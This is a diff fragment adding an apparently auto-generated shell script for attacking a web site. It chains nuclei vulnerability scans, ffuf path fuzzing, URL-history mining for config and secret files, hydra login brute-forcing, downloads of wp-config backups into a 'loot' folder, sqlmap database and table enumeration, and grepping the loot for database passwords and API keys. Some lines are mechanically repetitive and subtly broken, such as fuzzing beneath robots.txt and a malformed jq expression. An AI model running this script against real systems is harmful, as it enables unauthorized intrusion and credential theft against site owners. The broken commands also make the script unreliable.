+nuclei -u "$TARGET" -tags wp,lfi -o "$HOME/ops/$DOMAIN/evidence/nuclei_wp_lfi.txt"
+nuclei -u "$TARGET" -tags wp,rfi -o "$HOME/ops/$DOMAIN/evidence/nuclei_wp_rfi.txt"
+nuclei -u "$TARGET" -tags wp,takeover -o "$HOME/ops/$DOMAIN/evidence/nuclei_wp_takeover.txt"
+nuclei -u "$TARGET" -tags wp,default-login -o "$HOME/ops/$DOMAIN/evidence/nuclei_wp_default-login.txt"
+nuclei -u "$TARGET" -tags wp,token -o "$HOME/ops/$DOMAIN/evidence/nuclei_wp_token.txt"
+nuclei -u "$TARGET" -tags wp,api -o "$HOME/ops/$DOMAIN/evidence/nuclei_wp_api.txt"
+nuclei -u "$TARGET" -tags wp,graphql -o "$HOME/ops/$DOMAIN/evidence/nuclei_wp_graphql.txt"
+nuclei -u "$TARGET" -tags wp,debug -o "$HOME/ops/$DOMAIN/evidence/nuclei_wp_debug.txt"
+nuclei -u "$TARGET" -tags wp,backup -o "$HOME/ops/$DOMAIN/evidence/nuclei_wp_backup.txt"
+nuclei -u "$TARGET" -tags wp,config -o "$HOME/ops/$DOMAIN/evidence/nuclei_wp_config.txt"
+nuclei -u "$TARGET" -tags sqli,xss -o "$HOME/ops/$DOMAIN/evidence/nuclei_sqli_xss.txt"
+nuclei -u "$TARGET" -tags sqli,ssrf -o "$HOME/ops/$DOMAIN/evidence/nuclei_sqli_ssrf.txt"
+nuclei -u "$TARGET" -tags sqli,lfi -o "$HOME/ops/$DOMAIN/evidence/nuclei_sqli_lfi.txt"
+nuclei -u "$TARGET" -tags sqli,rfi -o "$HOME/ops/$DOMAIN/evidence/nuclei_sqli_rfi.txt"
+nuclei -u "$TARGET" -tags sqli,takeover -o "$HOME/ops/$DOMAIN/evidence/nuclei_sqli_takeover.txt"
+nuclei -u "$TARGET" -tags sqli,default-login -o "$HOME/ops/$DOMAIN/evidence/nuclei_sqli_default-login.txt"
+nuclei -u "$TARGET" -tags sqli,token -o "$HOME/ops/$DOMAIN/evidence/nuclei_sqli_token.txt"
+nuclei -u "$TARGET" -tags sqli,api -o "$HOME/ops/$DOMAIN/evidence/nuclei_sqli_api.txt"
+nuclei -u "$TARGET" -tags sqli,graphql -o "$HOME/ops/$DOMAIN/evidence/nuclei_sqli_graphql.txt"
+nuclei -u "$TARGET" -tags sqli,debug -o "$HOME/ops/$DOMAIN/evidence/nuclei_sqli_debug.txt"
+nuclei -u "$TARGET" -tags sqli,backup -o "$HOME/ops/$DOMAIN/evidence/nuclei_sqli_backup.txt"
+nuclei -u "$TARGET" -tags sqli,config -o "$HOME/ops/$DOMAIN/evidence/nuclei_sqli_config.txt"
+nuclei -u "$TARGET" -tags xss,ssrf -o "$HOME/ops/$DOMAIN/evidence/nuclei_xss_ssrf.txt"
+nuclei -u "$TARGET" -tags xss,lfi -o "$HOME/ops/$DOMAIN/evidence/nuclei_xss_lfi.txt"
+nuclei -u "$TARGET" -tags xss,rfi -o "$HOME/ops/$DOMAIN/evidence/nuclei_xss_rfi.txt"
+nuclei -u "$TARGET" -tags xss,takeover -o "$HOME/ops/$DOMAIN/evidence/nuclei_xss_takeover.txt"
+nuclei -u "$TARGET" -tags xss,default-login -o "$HOME/ops/$DOMAIN/evidence/nuclei_xss_default-login.txt"
+nuclei -u "$TARGET" -tags xss,token -o "$HOME/ops/$DOMAIN/evidence/nuclei_xss_token.txt"
+nuclei -u "$TARGET" -tags xss,api -o "$HOME/ops/$DOMAIN/evidence/nuclei_xss_api.txt"
+nuclei -u "$TARGET" -tags xss,graphql -o "$HOME/ops/$DOMAIN/evidence/nuclei_xss_graphql.txt"
+nuclei -u "$TARGET" -tags xss,debug -o "$HOME/ops/$DOMAIN/evidence/nuclei_xss_debug.txt"
+nuclei -u "$TARGET" -tags xss,backup -o "$HOME/ops/$DOMAIN/evidence/nuclei_xss_backup.txt"
+nuclei -u "$TARGET" -tags xss,config -o "$HOME/ops/$DOMAIN/evidence/nuclei_xss_config.txt"
+nuclei -u "$TARGET" -tags ssrf,lfi -o "$HOME/ops/$DOMAIN/evidence/nuclei_ssrf_lfi.txt"
+nuclei -u "$TARGET" -tags ssrf,rfi -o "$HOME/ops/$DOMAIN/evidence/nuclei_ssrf_rfi.txt"
+nuclei -u "$TARGET" -tags ssrf,takeover -o "$HOME/ops/$DOMAIN/evidence/nuclei_ssrf_takeover.txt"
+nuclei -u "$TARGET" -tags ssrf,default-login -o "$HOME/ops/$DOMAIN/evidence/nuclei_ssrf_default-login.txt"
+ffuf -u "$TARGET/admin/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_admin_200.json"
+ffuf -u "$TARGET/api/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_api_200.json"
+ffuf -u "$TARGET/api/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_api_v1_200.json"
+ffuf -u "$TARGET/graphql/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_graphql_200.json"
+ffuf -u "$TARGET/swagger/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_swagger_200.json"
+ffuf -u "$TARGET/wp-admin/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_wp-admin_200.json"
+ffuf -u "$TARGET/wp-login.php/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_wp-login.php_200.json"
+ffuf -u "$TARGET/.git/config/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_.git_config_200.json"
+ffuf -u "$TARGET/robots.txt/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_robots.txt_200.json"
+ffuf -u "$TARGET/admin/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 204 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_admin_204.json"
+ffuf -u "$TARGET/api/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 204 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_api_204.json"
+ffuf -u "$TARGET/api/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 204 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_api_v1_204.json"
+ffuf -u "$TARGET/graphql/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 204 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_graphql_204.json"
+ffuf -u "$TARGET/swagger/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 204 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_swagger_204.json"
+ffuf -u "$TARGET/wp-admin/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 204 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_wp-admin_204.json"
+ffuf -u "$TARGET/wp-login.php/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 204 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_wp-login.php_204.json"
+ffuf -u "$TARGET/.git/config/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 204 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_.git_config_204.json"
+ffuf -u "$TARGET/robots.txt/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 204 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_robots.txt_204.json"
+ffuf -u "$TARGET/admin/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 301 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_admin_301.json"
+ffuf -u "$TARGET/api/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 301 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_api_301.json"
+ffuf -u "$TARGET/api/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 301 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_api_v1_301.json"
+ffuf -u "$TARGET/graphql/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 301 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_graphql_301.json"
+ffuf -u "$TARGET/swagger/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 301 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_swagger_301.json"
+ffuf -u "$TARGET/wp-admin/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 301 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_wp-admin_301.json"
+ffuf -u "$TARGET/wp-login.php/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 301 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_wp-login.php_301.json"
+ffuf -u "$TARGET/.git/config/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 301 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_.git_config_301.json"
+ffuf -u "$TARGET/robots.txt/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 301 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_robots.txt_301.json"
+ffuf -u "$TARGET/admin/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 302 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_admin_302.json"
+ffuf -u "$TARGET/api/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 302 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_api_302.json"
+ffuf -u "$TARGET/api/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 302 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_api_v1_302.json"
+ffuf -u "$TARGET/graphql/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 302 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_graphql_302.json"
+ffuf -u "$TARGET/swagger/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 302 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_swagger_302.json"
+ffuf -u "$TARGET/wp-admin/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 302 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_wp-admin_302.json"
+ffuf -u "$TARGET/wp-login.php/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 302 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_wp-login.php_302.json"
+ffuf -u "$TARGET/.git/config/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 302 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_.git_config_302.json"
+ffuf -u "$TARGET/robots.txt/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 302 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_robots.txt_302.json"
+ffuf -u "$TARGET/admin/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 307 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_admin_307.json"
+ffuf -u "$TARGET/api/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 307 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_api_307.json"
+ffuf -u "$TARGET/api/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 307 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_api_v1_307.json"
+ffuf -u "$TARGET/graphql/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 307 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_graphql_307.json"
+ffuf -u "$TARGET/swagger/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 307 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_swagger_307.json"
+ffuf -u "$TARGET/wp-admin/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 307 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_wp-admin_307.json"
+ffuf -u "$TARGET/wp-login.php/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 307 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_wp-login.php_307.json"
+ffuf -u "$TARGET/.git/config/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 307 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_.git_config_307.json"
+ffuf -u "$TARGET/robots.txt/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 307 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_robots.txt_307.json"
+ffuf -u "$TARGET/admin/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 401 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_admin_401.json"
+ffuf -u "$TARGET/api/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 401 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_api_401.json"
+ffuf -u "$TARGET/api/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 401 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_api_v1_401.json"
+ffuf -u "$TARGET/graphql/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 401 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_graphql_401.json"
+ffuf -u "$TARGET/swagger/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 401 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_swagger_401.json"
+ffuf -u "$TARGET/wp-admin/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 401 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_wp-admin_401.json"
+ffuf -u "$TARGET/wp-login.php/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 401 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_wp-login.php_401.json"
+ffuf -u "$TARGET/.git/config/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 401 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_.git_config_401.json"
+ffuf -u "$TARGET/robots.txt/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 401 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_robots.txt_401.json"
+ffuf -u "$TARGET/admin/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 403 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_admin_403.json"
+ffuf -u "$TARGET/api/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 403 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_api_403.json"
+ffuf -u "$TARGET/api/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 403 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_api_v1_403.json"
+ffuf -u "$TARGET/graphql/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 403 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_graphql_403.json"
+ffuf -u "$TARGET/swagger/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 403 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_swagger_403.json"
+ffuf -u "$TARGET/wp-admin/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 403 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_wp-admin_403.json"
+ffuf -u "$TARGET/wp-login.php/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 403 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_wp-login.php_403.json"
+ffuf -u "$TARGET/.git/config/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 403 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_.git_config_403.json"
+ffuf -u "$TARGET/robots.txt/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 403 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_robots.txt_403.json"
+ffuf -u "$TARGET/admin/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 500 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_admin_500.json"
+ffuf -u "$TARGET/api/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 500 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_api_500.json"
+ffuf -u "$TARGET/api/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 500 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_api_v1_500.json"
+ffuf -u "$TARGET/graphql/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 500 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_graphql_500.json"
+ffuf -u "$TARGET/swagger/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 500 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_swagger_500.json"
+ffuf -u "$TARGET/wp-admin/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 500 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_wp-admin_500.json"
+ffuf -u "$TARGET/wp-login.php/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 500 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_wp-login.php_500.json"
+ffuf -u "$TARGET/.git/config/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 500 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_.git_config_500.json"
+ffuf -u "$TARGET/robots.txt/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 500 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_robots.txt_500.json"
+ffuf -u "$TARGET/admin/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 405 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_admin_405.json"
+ffuf -u "$TARGET/api/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 405 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_api_405.json"
+ffuf -u "$TARGET/api/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 405 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_api_v1_405.json"
+ffuf -u "$TARGET/graphql/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 405 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_graphql_405.json"
+ffuf -u "$TARGET/swagger/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 405 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_swagger_405.json"
+ffuf -u "$TARGET/wp-admin/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 405 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_wp-admin_405.json"
+ffuf -u "$TARGET/wp-login.php/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 405 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_wp-login.php_405.json"
+ffuf -u "$TARGET/.git/config/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 405 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_.git_config_405.json"
+ffuf -u "$TARGET/robots.txt/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 405 -o "$HOME/ops/$DOMAIN/fuzz/ffuf_robots.txt_405.json"
+gau "$DOMAIN" | grep -Ei "wp-config" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_wp-config.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "wp-config" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_wp-config.txt"
+gau "$DOMAIN" | grep -Ei "\.sql" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_dotsql.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "\.sql" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_dotsql.txt"
+gau "$DOMAIN" | grep -Ei "phpmyadmin" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_phpmyadmin.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "phpmyadmin" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_phpmyadmin.txt"
+gau "$DOMAIN" | grep -Ei "adminer" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_adminer.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "adminer" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_adminer.txt"
+gau "$DOMAIN" | grep -Ei "\.env" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_dotenv.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "\.env" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_dotenv.txt"
+gau "$DOMAIN" | grep -Ei "debug\.log" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_debugdotlog.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "debug\.log" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_debugdotlog.txt"
+gau "$DOMAIN" | grep -Ei "\.git" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_dotgit.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "\.git" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_dotgit.txt"
+gau "$DOMAIN" | grep -Ei "graphql" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_graphql.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "graphql" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_graphql.txt"
+gau "$DOMAIN" | grep -Ei "swagger" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_swagger.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "swagger" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_swagger.txt"
+gau "$DOMAIN" | grep -Ei "openapi" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_openapi.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "openapi" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_openapi.txt"
+gau "$DOMAIN" | grep -Ei "backup" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_backup.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "backup" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_backup.txt"
+gau "$DOMAIN" | grep -Ei "dump" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_dump.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "dump" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_dump.txt"
+gau "$DOMAIN" | grep -Ei "api/" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_api/.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "api/" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_api/.txt"
+gau "$DOMAIN" | grep -Ei "token" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_token.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "token" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_token.txt"
+gau "$DOMAIN" | grep -Ei "oauth" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_oauth.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "oauth" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_oauth.txt"
+gau "$DOMAIN" | grep -Ei "id=" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_id=.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "id=" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_id=.txt"
+gau "$DOMAIN" | grep -Ei "order=" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_order=.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "order=" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_order=.txt"
+gau "$DOMAIN" | grep -Ei "user=" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_user=.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "user=" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_user=.txt"
+gau "$DOMAIN" | grep -Ei "upload" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_upload.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "upload" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_upload.txt"
+gau "$DOMAIN" | grep -Ei "\.bak" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_dotbak.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "\.bak" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_dotbak.txt"
+gau "$DOMAIN" | grep -Ei "config\.php" | sort -u > "$HOME/ops/$DOMAIN/urls/grep_gau_configdotphp.txt"
+cat "$HOME/ops/$DOMAIN/urls/gau.txt" | grep -Ei "config\.php" | httpx -mc 200,403,500 -o "$HOME/ops/$DOMAIN/live/grep_configdotphp.txt"
+hydra -L users.txt -P pass.txt "$DOMAIN" http-get "/login:user=^USER^&pass=^PASS^:F=fail" -t 4 -o "$HOME/ops/$DOMAIN/fuzz/hydra_http_get.txt"
+hydra -L users.txt -P pass.txt "$DOMAIN" http-post-form "/login:user=^USER^&pass=^PASS^:F=fail" -t 4 -o "$HOME/ops/$DOMAIN/fuzz/hydra_http_post_form.txt"
+hydra -L users.txt -P pass.txt "$DOMAIN" https-form-post "/login:user=^USER^&pass=^PASS^:F=fail" -t 4 -o "$HOME/ops/$DOMAIN/fuzz/hydra_https_form_post.txt"
+curl -sS "$TARGET" -o "$HOME/ops/$DOMAIN/loot/index.html"
+curl -sS "$TARGET/wp-config.php.bak" -o "$HOME/ops/$DOMAIN/loot/wp-config.php.bak"
+wget -q "$TARGET/readme.html" -O "$HOME/ops/$DOMAIN/loot/readme.html"
+httpx -l "$HOME/ops/$DOMAIN/urls/high_value.txt" -json -o "$HOME/ops/$DOMAIN/loot/httpx.json"
+nuclei -u "$TARGET" -json -o "$HOME/ops/$DOMAIN/loot/nuclei.json"
+sqlmap -u "$TARGET/page?id=1" -p id --batch --banner --current-user --current-db 2>&1 | tee "$HOME/ops/$DOMAIN/loot/sqlmap_meta.txt"
+grep -RinE "DB_NAME|DB_USER|DB_PASSWORD|API_KEY|SECRET" "$HOME/ops/$DOMAIN/loot/" | tee "$HOME/ops/$DOMAIN/loot/grep_secrets.txt"
+tar -czf "$HOME/ops/$DOMAIN/evidence/loot_$(date +%F).tar.gz" -C "$HOME/ops/$DOMAIN" loot evidence
+while read -r u; do f=$(echo "$u" | md5sum | cut -c1-12); curl -sS "$u" -o "$HOME/ops/$DOMAIN/loot/$f.body"; done < "$HOME/ops/$DOMAIN/live/fetch_these.txt"
+jq -r ".url + " " + (.status_code|tostring)" "$HOME/ops/$DOMAIN/loot/httpx.json" | tee "$HOME/ops/$DOMAIN/loot/httpx_flat.txt"
+sqlmap -u "$TARGET/item?id=1" -p id --batch --count --tables --threads=1 2>&1 | tee "$HOME/ops/$DOMAIN/loot/sqlmap_id_tables.txt"
+sqlmap -u "$TARGET/item?uid=1" -p uid --batch --count --tables --threads=1 2>&1 | tee "$HOME/ops/$DOMAIN/loot/sqlmap_uid_tables.txt"
+sqlmap -u "$TARGET/item?pid=1" -p pid --batch --count --tables --threads=1 2>&1 | tee "$HOME/ops/$DOMAIN/loot/sqlmap_pid_tables.txt"
+sqlmap -u "$TARGET/item?user=1" -p user --batch --count --tables --threads=1 2>&1 | tee "$HOME/ops/$DOMAIN/loot/sqlmap_user_tables.txt"
+sqlmap -u "$TARGET/item?user_id=1" -p user_id --batch --count --tables --threads=1 2>&1 | tee "$HOME/ops/$DOMAIN/loot/sqlmap_user_id_tables.txt"
+sqlmap -u "$TARGET/item?product_id=1" -p product_id --batch --count --tables --threads=1 2>&1 | tee "$HOME/ops/$DOMAIN/loot/sqlmap_product_id_tables.txt"
+sqlmap -u "$TARGET/item?order_id=1" -p order_id --batch --count --tables --threads=1 2>&1 | tee "$HOME/ops/$DOMAIN/loot/sqlmap_order_id_tables.txt"
+sqlmap -u "$TARGET/item?page=1" -p page --batch --count --tables --threads=1 2>&1 | tee "$HOME/ops/$DOMAIN/loot/sqlmap_page_tables.txt"
